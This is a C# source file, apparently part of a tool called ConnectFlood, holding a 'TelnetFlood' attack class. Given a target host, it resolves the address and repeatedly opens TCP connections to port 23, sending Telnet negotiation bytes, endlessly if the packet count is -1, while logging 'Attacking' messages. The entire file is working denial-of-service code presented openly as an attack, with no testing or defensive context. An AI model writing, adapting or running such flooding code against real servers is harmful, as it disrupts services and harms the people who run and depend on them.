using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class TelnetFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            string host = target;
            if (Uri.IsWellFormedUriString(target, UriKind.Absolute))
            {
                Uri uri = new Uri(target);
                host = uri.Host;
            }
            IPAddress ipAddr;
            if (!IPAddress.TryParse(host, out ipAddr))
            {
                try
                {
                    ipAddr = Dns.GetHostEntry(host).AddressList[0];
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Error occurred while resolving host: {ex.Message}");
                    return;
                }
            }
            Console.WriteLine($"[Telnet] Attacking {host} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms | Port: 23");
            int sentPackets = 0;
            IPEndPoint telnetServer = new IPEndPoint(ipAddr, 23); 

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                    {
                        socket.Connect(telnetServer);

                        byte[] telnetRequest = GenerateTelnetRequest();
                        socket.Send(telnetRequest);

                        Console.WriteLine($"[Telnet] Packet {sentPackets + 1} sent to {host}:23");
                    }

                    sentPackets++;
                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Telnet] Error: {ex.Message}");
                }
            }
            Console.WriteLine("[Telnet] Attack finished.");
        }

        private byte[] GenerateTelnetRequest()
        {
            return new byte[] { 0xFF, 0xFD, 0x01 };
        }
    }
}
